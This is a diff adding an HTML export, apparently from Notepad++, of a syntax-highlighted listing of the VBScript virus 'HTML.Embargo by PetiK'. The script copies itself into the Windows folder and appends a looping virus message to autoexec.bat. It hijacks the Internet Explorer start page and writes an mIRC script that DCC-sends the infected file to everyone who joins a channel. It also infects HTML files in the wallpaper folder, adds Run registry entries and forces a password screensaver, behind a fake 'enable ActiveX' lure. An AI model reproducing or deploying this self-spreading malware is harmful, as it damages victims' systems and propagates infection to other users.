@@ -1,0 +1,163 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+	font-weight: bold;
+}
+.sc1 {
+	color: #0000FF;
+}
+.sc2 {
+}
+.sc3 {
+	color: #FF0000;
+}
+.sc5 {
+	color: #FF0000;
+}
+.sc8 {
+}
+.sc19 {
+	color: #FF8000;
+	background: #FEFDE0;
+}
+.sc40 {
+}
+.sc41 {
+	background: #F2F4FF;
+}
+.sc45 {
+	color: #FF0000;
+	background: #F2F4FF;
+}
+.sc46 {
+	background: #F2F4FF;
+}
+.sc47 {
+	font-weight: bold;
+	font-style: italic;
+	color: #000080;
+	background: #F2F4FF;
+}
+.sc48 {
+	color: #808080;
+	background: #F2F4FF;
+}
+.sc50 {
+	font-weight: bold;
+	background: #F2F4FF;
+}
+.sc51 {
+	font-weight: bold;
+	color: #808080;
+	background: #F2F4FF;
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">&lt;embargo&gt;</span><span class="sc0">
+</span><span class="sc1">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;</span><span class="sc0">WinHelp</span><span class="sc1">&lt;/TITLE&gt;&lt;/HEAD&gt;</span><span class="sc0">
+</span><span class="sc1">&lt;BODY</span><span class="sc8"> </span><span class="sc3">bgColor</span><span class="sc8">=</span><span class="sc5">#ffffff</span><span class="sc1">&gt;</span><span class="sc0">
+
+</span><span class="sc1">&lt;SCRIPT</span><span class="sc8"> </span><span class="sc3">Language</span><span class="sc8">=</span><span class="sc19">VBScript</span><span class="sc1">&gt;</span><span class="sc40">
+</span><span class="sc46">On</span><span class="sc41"> </span><span class="sc46">Error</span><span class="sc41"> </span><span class="sc46">Resume</span><span class="sc41"> </span><span class="sc46">Next</span><span class="sc41">
+</span><span class="sc46">Set</span><span class="sc41"> </span><span class="sc46">fso</span><span class="sc50">=</span><span class="sc46">CreateObject</span><span class="sc50">(</span><span class="sc48">"Scripting.FileSystemObject"</span><span class="sc50">)</span><span class="sc41">
+</span><span class="sc46">Set</span><span class="sc41"> </span><span class="sc46">ws</span><span class="sc50">=</span><span class="sc46">CreateObject</span><span class="sc50">(</span><span class="sc48">"WScript.Shell"</span><span class="sc50">)</span><span class="sc41">
+
+</span><span class="sc46">Set</span><span class="sc41"> </span><span class="sc46">original</span><span class="sc50">=</span><span class="sc46">document.body.createTextRange</span><span class="sc41">
+</span><span class="sc46">Set</span><span class="sc41"> </span><span class="sc46">copie</span><span class="sc50">=</span><span class="sc46">fso.CreateTextFile</span><span class="sc50">(</span><span class="sc46">fso.GetSpecialFolder</span><span class="sc50">(</span><span class="sc45">0</span><span class="sc50">)&amp;</span><span class="sc48">"\WinHelp.htm"</span><span class="sc50">)</span><span class="sc41">
+</span><span class="sc46">copie.WriteLine</span><span class="sc41"> </span><span class="sc48">"&lt;embargo&gt;"</span><span class="sc41">
+</span><span class="sc46">copie.WriteLine</span><span class="sc41"> </span><span class="sc48">"&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;WinHelp&lt;/TITLE&gt;&lt;/HEAD&gt;"</span><span class="sc41">
+</span><span class="sc46">copie.WriteLine</span><span class="sc41"> </span><span class="sc48">"&lt;BODY bgColor=#ffffff&gt;"</span><span class="sc41">
+</span><span class="sc46">copie.WriteLine</span><span class="sc41"> </span><span class="sc46">original.htmltext</span><span class="sc41">
+</span><span class="sc46">copie.WriteLine</span><span class="sc41"> </span><span class="sc48">"&lt;/BODY&gt;&lt;/HTML&gt;"</span><span class="sc41">
+</span><span class="sc46">copie.Close</span><span class="sc50">()</span><span class="sc41">
+
+</span><span class="sc46">reg</span><span class="sc50">=</span><span class="sc46">ws.RegRead</span><span class="sc50">(</span><span class="sc48">"HKLM\Software\HTML.Embargo\")</span><span class="sc51">
+</span><span class="sc46">If</span><span class="sc41"> </span><span class="sc46">reg</span><span class="sc41"> </span><span class="sc50">&lt;&gt;</span><span class="sc41"> </span><span class="sc48">"c parti"</span><span class="sc41"> </span><span class="sc46">Then</span><span class="sc41">
+</span><span class="sc46">Set</span><span class="sc41"> </span><span class="sc46">auto</span><span class="sc50">=</span><span class="sc46">fso.OpenTextFile</span><span class="sc50">(</span><span class="sc48">"C:\autoexec.bat"</span><span class="sc50">,</span><span class="sc41"> </span><span class="sc45">1</span><span class="sc50">,</span><span class="sc41"> </span><span class="sc46">False</span><span class="sc50">,</span><span class="sc41"> </span><span class="sc46">False</span><span class="sc50">)</span><span class="sc41">
+</span><span class="sc46">tout</span><span class="sc50">=</span><span class="sc46">auto.ReadAll</span><span class="sc41">
+</span><span class="sc46">Set</span><span class="sc41"> </span><span class="sc46">nouveau</span><span class="sc50">=</span><span class="sc41"> </span><span class="sc46">fso.CreateTextFile</span><span class="sc50">(</span><span class="sc48">"C:\autoexec.bat"</span><span class="sc50">,</span><span class="sc41"> </span><span class="sc46">True</span><span class="sc50">,</span><span class="sc41"> </span><span class="sc46">False</span><span class="sc50">)</span><span class="sc41">
+</span><span class="sc46">nouveau.Write</span><span class="sc50">(</span><span class="sc46">tout</span><span class="sc50">)</span><span class="sc41">
+</span><span class="sc46">nouveau.WriteLine</span><span class="sc41"> </span><span class="sc48">""</span><span class="sc41">
+</span><span class="sc46">nouveau.WriteLine</span><span class="sc41"> </span><span class="sc48">"@echo off"</span><span class="sc41">
+</span><span class="sc46">nouveau.WriteLine</span><span class="sc41"> </span><span class="sc48">":embargo"</span><span class="sc41">
+</span><span class="sc46">nouveau.WriteLine</span><span class="sc41"> </span><span class="sc48">"cls"</span><span class="sc41">
+</span><span class="sc46">nouveau.WriteLine</span><span class="sc41"> </span><span class="sc48">"echo This is the signature of my new virus"</span><span class="sc41">
+</span><span class="sc46">nouveau.WriteLine</span><span class="sc41"> </span><span class="sc48">"echo."</span><span class="sc41">
+</span><span class="sc46">nouveau.WriteLine</span><span class="sc41"> </span><span class="sc48">"echo HTML.Embargo by PetiK"</span><span class="sc41">
+</span><span class="sc46">nouveau.WriteLine</span><span class="sc41"> </span><span class="sc48">"echo Made In France (c)2001"</span><span class="sc41">
+</span><span class="sc46">nouveau.WriteLine</span><span class="sc41"> </span><span class="sc48">"pause"</span><span class="sc41">
+</span><span class="sc46">nouveau.WriteLine</span><span class="sc41"> </span><span class="sc48">"goto embargo"</span><span class="sc41">
+</span><span class="sc46">nouveau.Close</span><span class="sc50">()</span><span class="sc41">
+</span><span class="sc46">ws.RegWrite</span><span class="sc41"> </span><span class="sc48">"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"</span><span class="sc50">,</span><span class="sc46">fso.GetSpecialFolder</span><span class="sc50">(</span><span class="sc45">0</span><span class="sc50">)&amp;</span><span class="sc48">"\WinHelp.htm"</span><span class="sc41">
+</span><span class="sc46">ws.RegWrite</span><span class="sc41"> </span><span class="sc48">"HKCU\Software\Microsoft\Internet Explorer\Main\FullScreen"</span><span class="sc50">,</span><span class="sc48">"yes"</span><span class="sc41">
+</span><span class="sc46">ws.RegWrite</span><span class="sc41"> </span><span class="sc48">"HKLM\Software\HTML.Embargo\","</span><span class="sc46">c</span><span class="sc41"> </span><span class="sc46">parti</span><span class="sc48">"</span><span class="sc51">
+</span><span class="sc46">End</span><span class="sc41"> </span><span class="sc46">If</span><span class="sc41">
+
+</span><span class="sc46">reg</span><span class="sc50">=</span><span class="sc46">ws.RegRead</span><span class="sc50">(</span><span class="sc48">"HKLM\Software\HTML.Embargo\mirc"</span><span class="sc50">)</span><span class="sc41">
+</span><span class="sc46">If</span><span class="sc41"> </span><span class="sc46">reg</span><span class="sc41"> </span><span class="sc50">&lt;&gt;</span><span class="sc41"> </span><span class="sc48">"c parti"</span><span class="sc41"> </span><span class="sc46">Then</span><span class="sc41">
+</span><span class="sc46">PFD</span><span class="sc50">=</span><span class="sc46">ws.RegRead</span><span class="sc50">(</span><span class="sc48">"HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir"</span><span class="sc50">)</span><span class="sc41">
+</span><span class="sc46">If</span><span class="sc41"> </span><span class="sc46">dossier</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc48">""</span><span class="sc41"> </span><span class="sc46">Then</span><span class="sc41">
+</span><span class="sc46">If</span><span class="sc41"> </span><span class="sc46">fso.FileExists</span><span class="sc50">(</span><span class="sc48">"c:\mirc\mirc.ini"</span><span class="sc50">)</span><span class="sc41"> </span><span class="sc46">Then</span><span class="sc41"> </span><span class="sc46">dossier</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc48">"c:\mirc"</span><span class="sc41">
+</span><span class="sc46">If</span><span class="sc41"> </span><span class="sc46">fso.FileExists</span><span class="sc50">(</span><span class="sc48">"c:\mirc32\mirc.ini"</span><span class="sc50">)</span><span class="sc41"> </span><span class="sc46">Then</span><span class="sc41"> </span><span class="sc46">dossier</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc48">"c:\mirc32"</span><span class="sc41">
+</span><span class="sc46">If</span><span class="sc41"> </span><span class="sc46">fso.FileExists</span><span class="sc50">(</span><span class="sc46">PFD</span><span class="sc41"> </span><span class="sc50">&amp;</span><span class="sc41"> </span><span class="sc48">"\mirc\mirc.ini"</span><span class="sc50">)</span><span class="sc41"> </span><span class="sc46">Then</span><span class="sc41"> </span><span class="sc46">dossier</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc46">PFD</span><span class="sc41"> </span><span class="sc50">&amp;</span><span class="sc41"> </span><span class="sc48">"\mirc"</span><span class="sc41">
+</span><span class="sc46">If</span><span class="sc41"> </span><span class="sc46">fso.FileExists</span><span class="sc50">(</span><span class="sc46">PFD</span><span class="sc41"> </span><span class="sc50">&amp;</span><span class="sc41"> </span><span class="sc48">"\mirc32\mirc.ini"</span><span class="sc50">)</span><span class="sc41"> </span><span class="sc46">Then</span><span class="sc41"> </span><span class="sc46">dossier</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc46">PFD</span><span class="sc41"> </span><span class="sc50">&amp;</span><span class="sc41"> </span><span class="sc48">"\mirc32"</span><span class="sc41">
+</span><span class="sc46">End</span><span class="sc41"> </span><span class="sc46">If</span><span class="sc41">
+</span><span class="sc46">If</span><span class="sc41"> </span><span class="sc46">dossier</span><span class="sc41"> </span><span class="sc50">&lt;&gt;</span><span class="sc41"> </span><span class="sc48">""</span><span class="sc41"> </span><span class="sc46">Then</span><span class="sc41">
+</span><span class="sc46">Set</span><span class="sc41"> </span><span class="sc46">script</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc46">fso.CreateTextFile</span><span class="sc50">(</span><span class="sc46">dossier</span><span class="sc41"> </span><span class="sc50">&amp;</span><span class="sc41"> </span><span class="sc48">"\script.ini"</span><span class="sc50">,</span><span class="sc41"> </span><span class="sc46">True</span><span class="sc50">)</span><span class="sc41">
+</span><span class="sc46">script.WriteLine</span><span class="sc41"> </span><span class="sc48">"[script]"</span><span class="sc41">
+</span><span class="sc46">script.WriteLine</span><span class="sc41"> </span><span class="sc48">"n0=on 1:JOIN:#:{"</span><span class="sc41">
+</span><span class="sc46">script.WriteLine</span><span class="sc41"> </span><span class="sc48">"n1= /if ( $nick == &amp;me ) (halt)"</span><span class="sc41">
+</span><span class="sc46">script.WriteLine</span><span class="sc41"> </span><span class="sc48">"n2= ./dcc send $nick "</span><span class="sc41"> </span><span class="sc50">&amp;</span><span class="sc41"> </span><span class="sc46">fso.GetSpecialFolder</span><span class="sc50">(</span><span class="sc45">0</span><span class="sc50">)&amp;</span><span class="sc48">"\WinHelp.htm"</span><span class="sc41">
+</span><span class="sc46">script.WriteLine</span><span class="sc41"> </span><span class="sc48">"n3=}"</span><span class="sc41">
+</span><span class="sc46">ws.RegWrite</span><span class="sc41"> </span><span class="sc48">"HKLM\Software\HTML.Embargo\mirc"</span><span class="sc50">,</span><span class="sc48">"c parti"</span><span class="sc41">
+</span><span class="sc46">End</span><span class="sc41"> </span><span class="sc46">If</span><span class="sc41">
+
+</span><span class="sc46">Set</span><span class="sc41"> </span><span class="sc46">FolderObj</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc46">fso.GetFolder</span><span class="sc50">(</span><span class="sc46">fso.GetSpecialFolder</span><span class="sc50">(</span><span class="sc45">0</span><span class="sc50">)&amp;</span><span class="sc48">"\WEB\WallPaper"</span><span class="sc50">)</span><span class="sc41">
+    </span><span class="sc46">Set</span><span class="sc41"> </span><span class="sc46">FO</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc46">FolderObj.Files</span><span class="sc41">
+    </span><span class="sc46">For</span><span class="sc41"> </span><span class="sc46">Each</span><span class="sc41"> </span><span class="sc46">cible</span><span class="sc41"> </span><span class="sc47">in</span><span class="sc41"> </span><span class="sc46">FO</span><span class="sc41">
+        </span><span class="sc46">ext</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc46">lcase</span><span class="sc50">(</span><span class="sc46">fso.GetExtensionName</span><span class="sc50">(</span><span class="sc46">cible.Name</span><span class="sc50">))</span><span class="sc41">
+        </span><span class="sc46">If</span><span class="sc41"> </span><span class="sc46">ext</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc48">"htm"</span><span class="sc41"> </span><span class="sc46">or</span><span class="sc41"> </span><span class="sc46">ext</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc48">"html"</span><span class="sc41"> </span><span class="sc46">Then</span><span class="sc41">
+           </span><span class="sc46">Set</span><span class="sc41"> </span><span class="sc46">vrai</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc46">fso.OpenTextFile</span><span class="sc50">(</span><span class="sc46">cible.path</span><span class="sc50">,</span><span class="sc41"> </span><span class="sc45">1</span><span class="sc50">,</span><span class="sc41"> </span><span class="sc47">false</span><span class="sc50">)</span><span class="sc41">
+           </span><span class="sc46">If</span><span class="sc41"> </span><span class="sc46">vrai.readline</span><span class="sc41"> </span><span class="sc50">&lt;&gt;</span><span class="sc41"> </span><span class="sc48">"&lt;embargo&gt;"</span><span class="sc41"> </span><span class="sc46">Then</span><span class="sc41">
+               </span><span class="sc46">vrai.Close</span><span class="sc50">()</span><span class="sc41">
+               </span><span class="sc46">Set</span><span class="sc41"> </span><span class="sc46">vrai</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc46">fso.OpenTextFile</span><span class="sc50">(</span><span class="sc46">cible.path</span><span class="sc50">,</span><span class="sc41"> </span><span class="sc45">1</span><span class="sc50">,</span><span class="sc41"> </span><span class="sc47">false</span><span class="sc50">)</span><span class="sc41">
+               </span><span class="sc46">htmorg</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc46">vrai.ReadAll</span><span class="sc50">()</span><span class="sc41">
+               </span><span class="sc46">vrai.Close</span><span class="sc50">()</span><span class="sc41">
+               </span><span class="sc46">Set</span><span class="sc41"> </span><span class="sc46">virus</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc46">document.body.createTextRange</span><span class="sc41">
+               </span><span class="sc46">Set</span><span class="sc41"> </span><span class="sc46">vrai</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc46">fso.CreateTextFile</span><span class="sc50">(</span><span class="sc46">cible.path</span><span class="sc50">,</span><span class="sc41"> </span><span class="sc46">True</span><span class="sc50">,</span><span class="sc41"> </span><span class="sc46">False</span><span class="sc50">)</span><span class="sc41">
+               </span><span class="sc46">vrai.WriteLine</span><span class="sc50">(</span><span class="sc46">htmorg</span><span class="sc50">)</span><span class="sc41">
+               </span><span class="sc46">vrai.WriteLine</span><span class="sc41"> </span><span class="sc48">""</span><span class="sc41">
+               </span><span class="sc46">vrai.WriteLine</span><span class="sc41"> </span><span class="sc46">virus.htmltext</span><span class="sc41">
+               </span><span class="sc46">vrai.Close</span><span class="sc50">()</span><span class="sc41">
+           </span><span class="sc46">Else</span><span class="sc41">
+               </span><span class="sc46">vrai.Close</span><span class="sc50">()</span><span class="sc41">
+           </span><span class="sc46">End</span><span class="sc41"> </span><span class="sc46">If</span><span class="sc41">
+        </span><span class="sc46">End</span><span class="sc41"> </span><span class="sc46">If</span><span class="sc41">
+    </span><span class="sc46">Next</span><span class="sc41">
+</span><span class="sc46">End</span><span class="sc41"> </span><span class="sc46">If</span><span class="sc41">
+
+</span><span class="sc46">If</span><span class="sc41"> </span><span class="sc46">Day</span><span class="sc50">(</span><span class="sc46">Now</span><span class="sc50">())</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc45">5</span><span class="sc41"> </span><span class="sc46">or</span><span class="sc41"> </span><span class="sc46">Day</span><span class="sc50">(</span><span class="sc46">Now</span><span class="sc50">))</span><span class="sc41"> </span><span class="sc50">=</span><span class="sc41"> </span><span class="sc45">17</span><span class="sc41"> </span><span class="sc46">Then</span><span class="sc41">
+</span><span class="sc46">ws.RegWrite</span><span class="sc41"> </span><span class="sc48">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\CDPlayer"</span><span class="sc50">,</span><span class="sc46">fso.GetSpecialFolder</span><span class="sc50">(</span><span class="sc45">0</span><span class="sc50">)&amp;</span><span class="sc48">"\Cdplayer.exe"</span><span class="sc41">
+</span><span class="sc46">ws.RegWrite</span><span class="sc41"> </span><span class="sc48">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\NotePad"</span><span class="sc50">,</span><span class="sc46">fso.GetSpecialFolder</span><span class="sc50">(</span><span class="sc45">0</span><span class="sc50">)&amp;</span><span class="sc48">"\Notepad.exe"</span><span class="sc41">
+</span><span class="sc46">ws.RegWrite</span><span class="sc41"> </span><span class="sc48">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\PaintBrush"</span><span class="sc50">,</span><span class="sc46">fso.GetSpecialFolder</span><span class="sc50">(</span><span class="sc45">0</span><span class="sc50">)&amp;</span><span class="sc48">"\Pbrush.exe"</span><span class="sc41">
+</span><span class="sc46">ws.RegWrite</span><span class="sc41"> </span><span class="sc48">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Explorer"</span><span class="sc50">,</span><span class="sc46">fso.GetSpecialFolder</span><span class="sc50">(</span><span class="sc45">0</span><span class="sc50">)&amp;</span><span class="sc48">"\Explorer.exe"</span><span class="sc41">
+</span><span class="sc46">ws.RegWrite</span><span class="sc41"> </span><span class="sc48">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\RegEdit"</span><span class="sc50">,</span><span class="sc46">fso.GetSpecialFolder</span><span class="sc50">(</span><span class="sc45">0</span><span class="sc50">)&amp;</span><span class="sc48">"\Regedit.exe"</span><span class="sc41">
+</span><span class="sc46">ws.RegWrite</span><span class="sc41"> </span><span class="sc48">"HKCU\Control Panel\Desktop\ScreenSaveTimeOut"</span><span class="sc50">,</span><span class="sc48">"60"</span><span class="sc41">
+</span><span class="sc46">ws.RegWrite</span><span class="sc41"> </span><span class="sc48">"HKCU\Control Panel\Desktop\ScreenSaveUsePassword"</span><span class="sc50">,</span><span class="sc41"> </span><span class="sc45">01</span><span class="sc50">,</span><span class="sc41"> </span><span class="sc48">"REG_DWORD"</span><span class="sc41">
+
+
+</span><span class="sc46">document.Write</span><span class="sc41"> </span><span class="sc48">"&lt;font face='verdana' color=blue size='2'&gt;Microsoft Internet Explorer&lt;br&gt;Please enabled ActiveX to see this page&lt;br&gt;&lt;/font&gt;"</span><span class="sc41">
+</span><span class="sc1">&lt;/SCRIPT&gt;</span><span class="sc0">
+</span><span class="sc1">&lt;/BODY&gt;&lt;/HTML&gt;</span><span class="sc0">
+</span></div></body>
+</html>
